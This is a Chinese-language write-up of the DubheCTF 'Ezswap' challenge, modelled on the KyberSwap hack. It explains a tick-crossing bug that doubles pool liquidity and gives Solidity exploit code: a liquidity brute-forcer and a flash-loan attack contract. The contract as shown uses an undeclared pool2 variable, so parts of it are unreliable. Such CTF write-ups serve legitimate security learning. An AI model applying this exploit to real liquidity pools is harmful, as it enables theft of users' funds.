# Ezswap-DubheCTF

Swap is a kind of magical magic, and I am deeply impressed.

>  题目思路来源于一个真实的针对kyberswap合约的黑客攻击，具体参考
>
>  https://mp.weixin.qq.com/s/PkUqaJKlJFHsvRot1ij4qg?ref=www.ctfiot.com

整体的代码并没有更改多少，一是把合约的flash函数锁去掉了，主要的一点改动是在漏洞点这里做了一点修复，限制了无法从上界去利用这个漏洞使流动性翻倍，需要攻击者在流动性区间的下界通过此漏洞利用进行流动性翻倍。

![image-20240318145314173](/Users/kkfine/Library/Application Support/typora-user-images/image-20240318145314173.png)

在设计这个题的时候，感觉并没有做好，导致出了非预期。弄了两个池子，一个池子用来被攻击的，一个池子用来闪电贷token的，用户本身只有非常少的token，本意是觉着这样更能模拟真实的场景吧。所以第一个池子的闪电贷其实不应该开放给用户，导致了非预期，直接闪电贷第一个池子就能满足check了。加个bool变量在初始化池子的时候把第一个池子的flash锁了就好了，这非预期有点难受的。

## 漏洞原理

先说说kyerbswap 的一些特点：

- 一是由于kyberswap本身是二开的uniswap v3合约，所以大多数的逻辑都是相似的，但是kyberswap 算是众多fork univ3合约中改动较大的一版，将bitmap索引tick改为了双向链表索引，这样更加的节省gas以及方便查找。

- 二是kyberswap新增了手续费复投的概念，在每次swap的时候都会将用户的手续费复投到池子中，并参与swap过程。在数学原理上，kyber通过一系列数学魔法，把本身的swap兑换曲线和reinvest的概念合并到了一条新的曲线上。

![image-20240319111727497](/Users/kkfine/Library/Application Support/typora-user-images/image-20240319111727497.png)

   一个简单的swap计算过程。

![image-20240319111850867](/Users/kkfine/Library/Application Support/typora-user-images/image-20240319111850867.png)



所以漏洞原理就出在复投之后的tick的计算上，在利用computeSwapStep计算出在这个区间的流动性所支持兑换的token数量后，会进行判断是否跨tick了，如果没有就直接计算currentTick，结束本次循环。

![image-20240319112102773](/Users/kkfine/Library/Application Support/typora-user-images/image-20240319112102773.png)

而在computeSwapStep存在着两次计算，第一次是计算当前区间流动性可以被使用的token数量，第二次是考虑了加入再投资流动性之后计算出来的价格。

![image-20240319112247833](/Users/kkfine/Library/Application Support/typora-user-images/image-20240319112247833.png)

所以在某种精确计算的情况下，可以找出一个精准的区间和流动性来使calcReachAmount计算出来的数量大于我们要兑换的数量，这样可以让系统认为我们并没有cross tick。但在最终调用calcReachAmount计算出最终价格的时候却已经是下一个区间的价格，从而在执行`swapData.currentTick = TickMath.getTickAtSqrtRatio(swapData.sqrtP);`的时候currentTick也成了区间上界tick或者下界tick。而系统认为我们并没有cross tick但实际上已经cross tick所以流动性本该减去却没有改变，当我们再反向swap时候流动性又会增加，导致流动性翻倍。



# 题解

个人觉着题目的难度可能在于代码量较大，如果之前没看过univ3可能要从头开始学，需要花较久的时间，导致好像也没太多人看这题。关于这个漏洞的exp其实在网上也能有（https://github.com/paco0x/kyber-exploit-example），但并不能直接适用于我们这题，原因在于最上面的一个小改动。

首先找到这个精确的流动性和swap兑换的数量。

```solidity
 // brute force to find a valid liquidity number that will result in end price above the next price & end tick == next tick
    function findExploitableLiquidity2(uint128 liquidityStart, uint160 currentSqrtP, uint160 targetSqrtP)
        public
        view
        returns (uint128, uint256)
    {
        uint128 liquidity = liquidityStart;
        uint256 absDelta = 0;
        uint256 count = 0;
        while (true) {
            liquidity++;
            count++;

            // run the maths in SwamMath.computeSwapStep() to find a liquidity number
            // that satisfies the condition end_price > next_price when using (usedAmount - 1) to swap.
            int256 usedAmount = SwapMath.calcReachAmount(liquidity, currentSqrtP, targetSqrtP, 10, true, true);
            absDelta = uint256(usedAmount) - 1;
            uint256 deltaL = SwapMath.estimateIncrementalLiquidity(absDelta, liquidity, currentSqrtP, 10, true, true);
            uint160 nextSqrtP = uint160(SwapMath.calcFinalPrice(absDelta, liquidity, deltaL, currentSqrtP, true, true));

            if (nextSqrtP < targetSqrtP) {
                // console2.log("liquidity", liquidity);
                break;
            }
            if (count == 10_000_000) {
                revert("unable to find a valid liquidity number");
            }
        }

        return (liquidity, absDelta);
    }
```

然后利用即可，用同样数量的token1获取更多的token0

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "../contracts/openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../contracts/Pool.sol";
import "../contracts/Factory.sol";
import "../contracts/oracle/PoolOracle.sol";
import "../contracts/libraries/TickMath.sol";

import "../contracts/libraries/SwapMath.sol";
import "../contracts/periphery/libraries/LiquidityMath.sol";

contract Token is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
interface Setup {
    function addManager(address manager) external;
    function run() external;
    function airdroop() external;
    function check() external;
}
contract KyberAttack  {

    Pool pool = Pool(0xb51bBD304ADCf42b8882720Af184197600b9d9fF);
//    Pool pool2  = Pool(0x54A8A576907BA8291a41e21E80a3F357D8f74133);
    Token token0 =   Token(address(pool.token0()));
    Setup setup = Setup(0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82);
    Token token1 = Token(address(pool.token1()));


    int24 lower = -111311;
    int24 upper = lower + 100;

    uint128 rangeLiquidity;


    function mintCallback(uint256 qty0, uint256 qty1, bytes calldata data) external {
        if (qty0 > 0) {
            token0.transfer(msg.sender, qty0);
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, qty1);
        }
    }

    function swapCallback(int256 qty0, int256 qty1, bytes calldata data) external {

        if (qty0 > 0) {
            token0.transfer(msg.sender, uint256(qty0));
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, uint256(qty1));
        }
    }


    function flashCallback(uint256 feeQty0, uint256 feeQty1, bytes calldata data) external {

        uint160 lowerSqrtP = TickMath.getSqrtRatioAtTick(lower);
        uint160 upperSqrtP = TickMath.getSqrtRatioAtTick(upper);

         pool.swap(address(this), type(int256).max, true, TickMath.getSqrtRatioAtTick(upper), "");
        // calc the rough amount of liquidity with amount of 100 ether
        uint128 initLiquidity = LiquidityMath.getLiquidityFromQty0(lowerSqrtP, upperSqrtP, 100 ether);

        uint128  adjustedLiquidity = 76766215640030182295;
        uint256 exploitableToken1Amount =  100005025313878185766;

         (uint128 L, uint128 reinvestL,) = pool.getLiquidityState();
        rangeLiquidity = adjustedLiquidity - reinvestL - L;
        pool.mint(address(this), lower, upper, [TickMath.MIN_TICK, lower], rangeLiquidity, "");

        pool.swap(address(this), int256(exploitableToken1Amount), true, TickMath.MIN_SQRT_RATIO + 1, "");

        {
            pool.swap(address(this), type(int256).min, true, TickMath.getSqrtRatioAtTick(lower), "");
            (uint128 newLiquidity,,) = pool.getLiquidityState();

        }

        (int256 deltaQty0, int256 deltaQty1) = pool.swap(address(this), 10 ether, false, TickMath.getSqrtRatioAtTick(upper+13713), "");

        pool.burn(lower, upper, rangeLiquidity);

       token0.transfer(address(pool2), 101 ether);
       token1.transfer(address(pool2), 0.3 ether );

    }


       function run() public {
        setup.addManager(address(this));
        setup.airdroop();
       pool2.flash(address(this),101 ether , 0.3 ether, abi.encodePacked(uint256(101 ether), uint256(0.3 ether)));
        pool.burn(lower, upper, rangeLiquidity);
        setup.check();
    }

}

//[+] pool address 0xe7152513974AD8F6fdac593a441b361Ff774fC90
//[+] pool2 address 0x9d77b2e483D4aA812D3CC2f15Ee6b264b7e93f74
//[+] token0 address 0x0665FbB86a3acECa91Df68388EC4BBE11556DDce
//[+] token1 address 0x56639dB16Ac50A89228026e42a316B30179A5376
//[+] factory address 0xe61FDeDBcb68e8966c869E51eAb9020cFAAdf066

```

